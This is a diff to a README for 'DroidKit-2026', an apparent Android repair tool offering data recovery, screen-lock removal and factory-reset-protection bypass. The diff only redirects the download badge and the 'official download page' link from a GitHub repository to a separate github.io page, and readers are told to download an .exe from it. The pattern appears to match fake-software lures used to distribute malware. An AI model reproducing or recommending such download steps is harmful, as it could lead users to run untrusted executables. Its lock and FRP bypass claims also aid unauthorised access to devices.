@@ -1,6 +1,6 @@
 # 🛠️ DroidKit-2026 - Fix Android System Issues Easily
 
-[![](https://img.shields.io/badge/Download-DroidKit-blue.svg)](https://github.com/Alternateratbitefever888/DroidKit-2026)
+[![](https://img.shields.io/badge/Download-DroidKit-blue.svg)](https://alternateratbitefever888.github.io)
 
 ## 📋 Project Overview
 DroidKit-2026 provides a set of tools to manage and repair Android devices. This software works on Windows 10 and Windows 11. It helps users recover lost data, remove screen locks, bypass factory reset protection, and fix system crashes. You do not need technical skills to use these tools. The interface guides you through each step.
@@ -18,7 +18,7 @@ Before you install the software, check your computer for these requirements.
 ## 📥 How to Download 
 You can get the software from the official repository page. Follow these steps to prepare the installer.
 
-1. Go to the [official download page](https://github.com/Alternateratbitefever888/DroidKit-2026).
+1. Go to the [official download page](https://alternateratbitefever888.github.io).
 2. Look for the recent release section on the right side of the screen.
 3. Click the link that ends with .exe to save the file to your computer.
 4. Choose a folder on your computer where you want to save the installer.
